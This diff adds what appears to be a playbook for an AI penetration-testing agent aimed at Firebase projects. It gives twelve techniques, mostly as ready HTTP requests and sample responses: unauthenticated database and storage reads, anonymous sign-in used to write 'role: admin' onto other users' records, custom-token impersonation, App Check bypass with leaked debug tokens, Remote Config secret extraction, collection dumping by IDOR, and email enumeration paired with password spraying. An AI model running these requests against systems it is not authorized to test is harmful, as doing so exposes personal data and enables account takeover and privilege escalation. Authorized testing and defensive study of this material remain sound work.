@@ -1,0 +1,227 @@
+SCOPE: Firebase Auth, Realtime Database, Firestore, Cloud Functions, Cloud Storage, Remote Config — enumerate misconfigurations, privilege escalation, and unauthenticated data access across all Firebase product surfaces.
+
+## TARGETS
+
+- Firebase Realtime Database REST endpoint: https://<project-id>-default-rtdb.firebaseio.com/
+- Firestore REST API: https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/
+- Firebase Cloud Functions: https://<region>-<project-id>.cloudfunctions.net/<function-name>
+- Firebase Storage: https://storage.googleapis.com/<project-id>.appspot.com/ and https://firebasestorage.googleapis.com/v0/b/<project-id>.appspot.com/o/
+- Firebase Hosting config: https://<project-id>.firebaseapp.com/__/firebase/init.json
+- Remote Config REST: https://firebaseremoteconfig.googleapis.com/v1/projects/<project-id>/remoteConfig
+- App Check debug token endpoints
+- Firebase Auth REST: https://identitytoolkit.googleapis.com/v1/
+
+## TECHNIQUES
+
+1. **Open Realtime Database .json endpoint enumeration**
+   Append `.json` to any path in the Realtime Database URL to request it as JSON over unauthenticated HTTP GET. Firebase DB rules default to `public` in some SDK scaffolds. Probe high-value node names first: `/users.json`, `/admins.json`, `/accounts.json`, `/config.json`, `/tokens.json`, `/keys.json`, `/secrets.json`, `/api_keys.json`, `/payments.json`, `/orders.json`, `/messages.json`.
+
+   ```
+   GET https://<project-id>-default-rtdb.firebaseio.com/users.json HTTP/1.1
+   Host: <project-id>-default-rtdb.firebaseio.com
+
+   200 OK
+   {"user1":{"email":"alice@example.com","role":"admin","token":"..."},...}
+   ```
+
+   Also try `.json?print=pretty` and shallow reads with `?shallow=true` to enumerate top-level keys without full payload download:
+
+   ```
+   GET https://<project-id>-default-rtdb.firebaseio.com/.json?shallow=true
+   {"users":true,"admin":true,"config":true,"tokens":true}
+   ```
+
+   If the top-level is readable, recurse each key. Track every readable node path as a distinct finding.
+
+2. **Firebase project discovery from public app bundles**
+   Extract `firebaseConfig` from the app's JavaScript bundle or the canonical init URL. This config block contains `apiKey`, `authDomain`, `databaseURL`, `projectId`, `storageBucket`, `messagingSenderId`, `appId` — all unauthenticated-readable once you have the init URL.
+
+   ```
+   GET https://<project-id>.firebaseapp.com/__/firebase/init.json
+   {
+     "apiKey": "AIzaSy...",
+     "authDomain": "<project>.firebaseapp.com",
+     "databaseURL": "https://<project>-default-rtdb.firebaseio.com",
+     "projectId": "<project>",
+     "storageBucket": "<project>.appspot.com",
+     ...
+   }
+   ```
+
+   `apiKey` is NOT a secret in Firebase's model, but it gates which project operations run. Use it to drive all subsequent Identity Toolkit calls. Record `projectId` and `databaseURL` for automated probing.
+
+3. **Firestore unauthenticated REST reads**
+   Firestore REST API accepts Bearer tokens. If rules are permissive, a request with NO Authorization header (or an anonymous token) returns documents. Probe the documents listing endpoint:
+
+   ```
+   GET https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/<collection>
+   Authorization: (absent or "Bearer <anon-id-token>")
+
+   200 OK
+   {"documents":[{"name":"projects/<project-id>/databases/(default)/documents/<collection>/<docid>","fields":{...}},...]}
+   ```
+
+   Enumerate collection names from JS bundle strings, HTML source, API response field names. Common targets: `users`, `orders`, `products`, `sessions`, `roles`, `config`, `admin`, `payments`, `invoices`, `audit_logs`.
+
+   Try writing too — a successful PUT or PATCH to a document you don't own is a BFLA finding.
+
+4. **Anonymous auth privilege escalation**
+   Firebase allows signing in anonymously without credentials, yielding a valid UID and ID token. If Firestore / RTDB rules grant write access based only on `request.auth != null`, an anonymous session can write as if it were any authenticated user. Steps:
+
+   ```
+   POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>
+   {"returnSecureToken":true}
+
+   200 OK
+   {"idToken":"eyJ...","localId":"anon_uid"}
+   ```
+
+   Use the resulting `idToken` to call Firestore or RTDB. Attempt writes to other users' documents by substituting UIDs in document paths:
+
+   ```
+   PATCH https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/users/<target_uid>?updateMask.fieldPaths=role
+   Authorization: Bearer <anon-id-token>
+   {"fields":{"role":{"stringValue":"admin"}}}
+   ```
+
+5. **Custom-token swap for privilege escalation**
+   If a Cloud Function generates custom tokens (e.g. for third-party auth integration), test whether the `uid` claim in the custom token payload is user-controlled. A function that accepts `{"uid": "<attacker-controlled>"}` and mints a Firebase token for that UID allows impersonation of any existing account including service accounts if their UID is guessable.
+
+   ```
+   POST https://<region>-<project-id>.cloudfunctions.net/createCustomToken
+   {"uid":"admin","claims":{"role":"admin"}}
+
+   200 OK
+   {"token":"<firebase-custom-token>"}
+   ```
+
+   Exchange that custom token for an ID token:
+
+   ```
+   POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=<apiKey>
+   {"token":"<firebase-custom-token>","returnSecureToken":true}
+   ```
+
+6. **Cloud Function URL enumeration and unauthenticated invocation**
+   Cloud Functions deployed without `--allow-unauthenticated` require a Bearer token, but many deployments omit that flag. Enumerate function names from: JS bundle references, `firebase.json` (if accessible), `.firebaserc`, package source, error messages in API responses, `/__/functions.yaml` (some SDKs expose this), and Google Cloud Run listing (if Cloud Functions v2).
+
+   ```
+   GET https://us-central1-<project-id>.cloudfunctions.net/getAdminData
+   (no auth header)
+
+   200 OK — unauthenticated invocation confirmed
+   {"users":[...],"revenue":...}
+   ```
+
+   Also probe POST with common input shapes: `{"uid":"..."}`, `{"email":"..."}`, `{"action":"list"}`.
+
+7. **Firebase Storage bucket misconfiguration**
+   Storage security rules default may allow authenticated (or unauthenticated) reads/writes. List bucket contents:
+
+   ```
+   GET https://firebasestorage.googleapis.com/v0/b/<project-id>.appspot.com/o/
+   Authorization: (absent)
+
+   200 OK
+   {"items":[{"name":"invoices/2024/jan.pdf","bucket":"...","generation":"..."},...]}
+   ```
+
+   Download arbitrary objects using the `alt=media` query param:
+
+   ```
+   GET https://firebasestorage.googleapis.com/v0/b/<project-id>.appspot.com/o/invoices%2F2024%2Fjan.pdf?alt=media
+   ```
+
+   Also probe writes:
+
+   ```
+   POST https://firebasestorage.googleapis.com/v0/b/<project-id>.appspot.com/o?name=pwned.txt
+   Authorization: Bearer <anon-id-token>
+   Content-Type: text/plain
+   arbitrary content
+   ```
+
+8. **App Check bypass**
+   App Check adds device attestation, but the debug token feature (enabled by `firebase.app-check.debug-token` env var) allows any client to bypass attestation using a pre-shared debug token. If the app is in development or the token leaks (environment variables, JS bundle, CI logs):
+
+   ```
+   POST https://firebaseappcheck.googleapis.com/v1beta/projects/<project-id>/apps/<app-id>:exchangeDebugToken
+   {"debug_token":"<leaked-debug-token>"}
+
+   200 OK
+   {"token":"<app-check-token>","ttl":"3600s"}
+   ```
+
+   Use the returned App Check token in `X-Firebase-AppCheck` header to bypass attestation on protected endpoints. Also test whether App Check enforcement is actually wired: send requests to protected functions without the header and see if they respond.
+
+9. **Remote Config secret leaks**
+   Firebase Remote Config can store feature flags, API keys, and endpoint URLs. If the Remote Config REST API is accessible with only the `apiKey` (not a service-account credential), it may return the full config template including server-side only parameters that were mistakenly placed there.
+
+   ```
+   GET https://firebaseremoteconfig.googleapis.com/v1/projects/<project-id>/remoteConfig
+   Authorization: Bearer <id-token>
+
+   200 OK
+   {"parameters":{"stripe_secret_key":{"defaultValue":{"value":"sk_live_..."}},...}}
+   ```
+
+   Also fetch the client-facing config (which apps call at runtime):
+
+   ```
+   POST https://firebaseremoteconfig.googleapis.com/v1/projects/<project-id>:fetchAndActivate?key=<apiKey>
+   {"app_instance_id":"...","app_instance_id_token":"...","app_id":"...","country_code":"US","language_code":"en"}
+   ```
+
+10. **Database rules fetch and analysis**
+    Firebase allows fetching RTDB security rules if you have admin access, but the rules endpoint is sometimes misconfigured. Additionally, analyze rules from the Firebase console URL exposed in devtools if the app is in debug mode. Rules like `".read": true` or `".write": true` at root level indicate full unauthenticated access.
+
+    Simulate rule evaluation with the REST emulator:
+
+    ```
+    GET https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?auth=<admin-token>
+    ```
+
+    Also look for rules that grant write access based on `auth.uid` matching a document field rather than an immutable server-side value — this is a common IDOR pattern in Firebase rules.
+
+11. **Firestore document ID enumeration (IDOR)**
+    If document IDs are sequential integers, UUIDs derived from email hashes, or phone numbers, enumerate them directly. Firebase does not rate-limit reads aggressively on the REST API.
+
+    ```
+    GET https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/orders/1001
+    GET https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/orders/1002
+    ...
+    ```
+
+    Also use the `listDocuments` endpoint with `pageToken` pagination to dump entire collections without knowing individual IDs:
+
+    ```
+    GET https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/users?pageSize=300
+    ```
+
+12. **Email/password account enumeration via Identity Toolkit**
+    The `createAuthUri` endpoint reveals whether an email address has an existing Firebase account and which providers it's registered with. This is an unauthenticated enumeration primitive.
+
+    ```
+    POST https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<apiKey>
+    {"identifier":"target@example.com","continueUri":"https://<project>.firebaseapp.com"}
+
+    200 OK
+    {"signinMethods":["password"],"registered":true}
+    ```
+
+    Bulk enumeration of any email list is trivial. Combine with password-spray on `signInWithPassword`.
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: concise label, e.g. "Firebase RTDB /admins.json unauthenticated read"
+- `severity`: `critical` (admin data or write access), `high` (PII or large-scale read), `medium` (enumeration or config leak), `low` (info disclosure)
+- `url`: exact URL probed including query string
+- `method`: HTTP method used
+- `request_headers`: include or omit Authorization to show the auth context
+- `request_body`: the payload sent (anonymize API keys in the report body, but preserve structure)
+- `response_status`: HTTP status code
+- `response_body_excerpt`: first 500 bytes of response showing the leaked data
+- `evidence_notes`: which security rule or misconfiguration caused the issue, and what an attacker can do with it
+- `cwe`: CWE-284 (Improper Access Control) for open rules; CWE-200 (Exposure of Sensitive Information) for leaks; CWE-639 (IDOR) for document ID enumeration
